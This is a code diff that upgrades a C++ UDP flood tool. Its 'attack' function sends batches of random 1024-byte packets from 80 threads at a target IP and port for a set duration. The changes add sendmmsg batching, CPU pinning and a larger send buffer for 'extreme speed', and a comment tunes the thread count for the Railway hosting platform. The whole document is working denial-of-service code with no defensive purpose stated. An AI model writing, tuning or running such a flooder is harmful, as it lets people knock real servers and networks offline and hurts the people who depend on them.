@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <iostream>
 #include <vector>
 #include <thread>
@@ -5,52 +6,72 @@
 #include <unistd.h>
 #include <cstring>
 #include <ctime>
-#include <fcntl.h>
+#include <sys/socket.h>
+#include <sched.h>
 
 using namespace std;
 
-char global_payload[1400];
-
-void prepare_payload() {
-    for (int i = 0; i < 1400; i++) {
-        global_payload[i] = (char)(rand() % 256);
-    }
-}
+// Performance Config
+#define PACKET_SIZE 1024
+#define VLEN 64             // Batch size (Extreme speed)
+#define THREAD_COUNT 80     // Railway optimized
 
 void attack(string ip, int port, int duration) {
+    // CPU Core Pinning: Har thread ko alag core par distribute karega
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(rand() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return;
 
-    fcntl(sock, F_SETFL, O_NONBLOCK);
-    struct sockaddr_in server_addr;
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
+    // Socket Buffer Maximize
+    int sndbuf = 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(ip.c_str());
+
+    // Soul-Logic: Batch Preparation
+    struct mmsghdr msgs[VLEN];
+    struct iovec iovecs[VLEN];
+    char buffers[VLEN][PACKET_SIZE];
+
+    for (int i = 0; i < VLEN; i++) {
+        for (int j = 0; j < PACKET_SIZE; j++) buffers[i][j] = (char)(rand() % 256);
+        iovecs[i].iov_base = buffers[i];
+        iovecs[i].iov_len = PACKET_SIZE;
+        msgs[i].msg_hdr.msg_iov = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &addr;
+        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
+    }
 
     time_t end = time(NULL) + duration;
     while (time(NULL) < end) {
-        sendto(sock, global_payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        sendto(sock, global_payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        // High-Speed Multi-Message Sending
+        sendmmsg(sock, msgs, VLEN, 0);
     }
     close(sock);
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 4) return 1;
+    
     srand(time(NULL));
-    prepare_payload();
+    string ip = argv[1];
+    int port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
 
-    string target_ip = argv[1];
-    int target_port = stoi(argv[2]);
-    int duration = stoi(argv[3]);
-
-    int threads_count = 200; 
     vector<thread> threads;
-    for (int i = 0; i < threads_count; i++) {
-        threads.push_back(thread(attack, target_ip, target_port, duration));
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        threads.push_back(thread(attack, ip, port, duration));
     }
-    for (auto &t : threads) if (t.joinable()) t.join();
 
+    for (auto &t : threads) t.join();
     return 0;
 }
